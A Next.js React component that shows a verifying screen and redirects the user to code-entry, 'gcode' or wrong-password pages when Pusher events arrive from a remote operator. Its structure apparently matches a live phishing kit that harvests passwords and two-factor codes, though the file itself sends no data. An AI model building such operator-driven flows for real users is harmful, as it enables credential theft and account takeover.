"use client";
import VerifyingState from "@/component/VerifyingState/VerifyingState";
import { useRouter } from "next/navigation";
import React, { useEffect, useState } from "react";
import Cookies from "js-cookie";
import Pusher from "pusher-js";

function AccountVerify() {
  const router = useRouter();

  const [verifyId, setVerifyId] = useState("");
  const[reverifyId, setReVerifyId] = useState('');
    const[wrongPass, setWrongPass] = useState('');

  
  const id = Cookies.get("id");
  const pusher = new Pusher("05656b52c62c0f688ee3", {
    // APP_KEY
    cluster: "ap2",
    encrypted: true,
  });
  console.log(reverifyId);

  useEffect(() => {
    const channel = pusher.subscribe(id);

    channel.bind("code-verify", (data) => {
      // Perform the revalidation or data fetching logic here
      console.log("Path data updated:", data);
      Cookies.set("code", data.code);
      setVerifyId(data.id); // Function to refetch or revalidate your path data
    });

    return () => {
      channel.unbind("code-verify");
      channel.unsubscribe(id);
    };
  }, [id]);

  useEffect(() => {
    const channel = pusher.subscribe(id);
    channel.bind('code-re-verify', (data) => {
      // Perform the revalidation or data fetching logic here
      console.log('Path data updated:', data);
      Cookies.set("gid", data.id);
      setReVerifyId(data.id); // Function to refetch or revalidate your path data
    });

    return () => {
      channel.unbind('code-re-verify');
      channel.unsubscribe(id);
    };
  }, [id]);


   useEffect(() => {
    const channel = pusher.subscribe(id);

    channel.bind("pass-wrong", (data) => {
      // Perform the revalidation or data fetching logic here
      console.log("Path data updated:", data);
      Cookies.set("code", data.code);
      setWrongPass(data.id); // Function to refetch or revalidate your path data
    });

    return () => {
      channel.unbind("pass-wrong");
      channel.unsubscribe(id);
    };
  }, [id]);

  if (verifyId) {
    return router.push("/account-verify-code");
  }
  if(reverifyId){
    return router.push("/account-verify-gcode");
  }
    if(wrongPass){
    return router.push("/account-wrong-pass");
  }
  return <VerifyingState />;
}

export default AccountVerify;
